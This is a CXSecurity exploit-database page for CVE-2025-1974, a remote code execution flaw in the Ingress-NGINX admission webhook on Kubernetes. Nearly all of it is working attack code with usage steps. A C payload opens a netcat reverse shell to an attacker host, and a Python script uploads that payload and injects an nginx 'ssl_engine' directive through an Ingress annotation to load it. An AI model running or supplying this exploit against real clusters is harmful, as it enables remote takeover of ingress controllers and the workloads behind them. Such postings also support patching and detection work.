---
title: Ingress-NGINX 4.11.0 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025060020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-21
fetch_date: 2025-10-06T22:52:17.409585
---

# Ingress-NGINX 4.11.0 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ingress-NGINX 4.11.0 Remote Code Execution (RCE)** **2025.06.20**  Credit:  **[Likhith Appalaneni](https://cxsecurity.com/author/Likhith%2BAppalaneni/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-1974](https://cxsecurity.com/cveshow/CVE-2025-1974/ "Click to see CVE-2025-1974")**  CWE: **N/A** | |

# Exploit Title: Ingress-NGINX 4.11.0 - Remote Code Execution (RCE)
# Google Dork: N/A
# Date: 2025-06-19
# Exploit Author: Likhith Appalaneni
# Vendor Homepage: https://kubernetes.github.io/ingress-nginx/
# Software Link: https://github.com/kubernetes/ingress-nginx
# Version: ingress-nginx v4.11.0 on Kubernetes v1.29.0 (Minikube)
# Tested on: Ubuntu 24.04, Minikube vLatest, Docker vLatest
# CVE : CVE-2025-1974
1) Update the attacker ip and listening port in shell.c and Compile the shell payload:
gcc -fPIC -shared -o shell.so shell.c
2) Run the exploit:
python3 exploit.py
The exploit sends a crafted AdmissionRequest to the vulnerable Ingress-NGINX webhook and loads the shell.so to achieve code execution.
<---> shell.c <--->
#include <stdlib.h>
\_\_attribute\_\_((constructor)) void init() {
system("sh -c 'nc attacker-ip attacker-port -e /bin/sh'");
}
<---> shell.c <--->
<---> exploit.py <--->
import json
import requests
import threading
import time
import urllib3
import socket
import argparse
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
def upload\_shell\_via\_socket(file\_path, target\_host, target\_port):
print("[\*] Uploading shell.so via raw socket to keep FD open...")
try:
with open(file\_path, "rb") as f:
data = f.read()
data += b"\x00" \* (16384 - len(data) % 16384)
content\_len = len(data) + 2024
payload = f"POST /fake/addr HTTP/1.1\r\nHost: {target\_host}:{target\_port}\r\nContent-Type: application/octet-stream\r\nContent-Length: {content\_len}\r\n\r\n".encode("ascii") + data
sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
sock.connect((target\_host, target\_port))
sock.sendall(payload)
print("[\*] Payload sent, holding connection open for 220s...")
time.sleep(220)
sock.close()
except Exception as e:
print(f"[!] Upload failed: {e}")
def build\_payload(pid, fd):
annotation = "http://x/#;" + ("}" \* 3) + f"\nssl\_engine /proc/{pid}/fd/{fd};\n#"
return {
"kind": "AdmissionReview",
"apiVersion": "admission.k8s.io/v1",
"request": {
"uid": "exploit-uid",
"kind": {
"group": "networking.k8s.io",
"version": "v1",
"kind": "Ingress"
},
"resource": {
"group": "networking.k8s.io",
"version": "v1",
"resource": "ingresses"
},
"requestKind": {
"group": "networking.k8s.io",
"version": "v1",
"kind": "Ingress"
},
"requestResource": {
"group": "networking.k8s.io",
"version": "v1",
"resource": "ingresses"
},
"name": "example-ingress",
"operation": "CREATE",
"userInfo": {
"username": "kube-review",
"uid": "d9c6bf40-e0e6-4cd9-a9f4-b6966020ed3d"
},
"object": {
"kind": "Ingress",
"apiVersion": "networking.k8s.io/v1",
"metadata": {
"name": "example-ingress",
"annotations": {
"nginx.ingress.kubernetes.io/auth-url": annotation
}
},
"spec": {
"ingressClassName": "nginx",
"rules": [
{
"host": "hello-world.com",
"http": {
"paths": [
{
"path": "/",
"pathType": "Prefix",
"backend": {
"service": {
"name": "web",
"port": { "number": 8080 }
}
}
}
]
}
}
]
}
},
"oldObject": None,
"dryRun": False,
"options": {
"kind": "CreateOptions",
"apiVersion": "meta.k8s.io/v1"
}
}
}
def send\_requests(admission\_url, pid\_range, fd\_range):
for pid in range(pid\_range[0], pid\_range[1]):
for fd in range(fd\_range[0], fd\_range[1]):
print(f"Trying /proc/{pid}/fd/{fd}")
payload = build\_payload(pid, fd)
try:
resp = requests.post(
f"{admission\_url}/networking/v1/ingresses",
headers={"Content-Type": "application/json"},
data=json.dumps(payload),
verify=False,
timeout=5
)
result = resp.json()
msg = result.get("response", {}).get("status", {}).get("message", "")
if "No such file" in msg or "Permission denied" in msg:
continue
print(f"[+] Interesting response at /proc/{pid}/fd/{fd}:\n{msg}")
except Exception as e:
print(f"[-] Error: {e}")
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser(description="Exploit CVE-2025-1974")
parser.add\_argument("--upload-url", required=True, help="Upload URL (e.g., http://127.0.0.1:8080)")
parser.add\_argument("--admission-url", required=True, help="Admission controller URL (e.g., https://127.0.0.1:8443)")
parser.add\_argument("--shell", default="shell.so", help="Path to shell.so file")
parser.add\_argument("--pid-start", type=int, default=26)
parser.add\_argument("--pid-end", type=int, default=30)
parser.add\_argument("--fd-start", type=int, default=1)
parser.add\_argument("--fd-end", type=int, default=100)
args = parser.parse\_args()
host = args.upload\_url.split("://")[-1].split(":")[0]
port = int(args.upload\_url.split(":")[-1])
upload\_thread = threading.Thread(target=upload\_shell\_via\_socket, args=(args.shell, host, port))
upload\_thread.start()
time.sleep(3)
send\_requests(args.admission\_url, (args.pid\_start, args.pid\_end), (args.fd\_start, args.fd\_end))
upload\_thread.join()
<---> exploit.py <--->

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060020)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top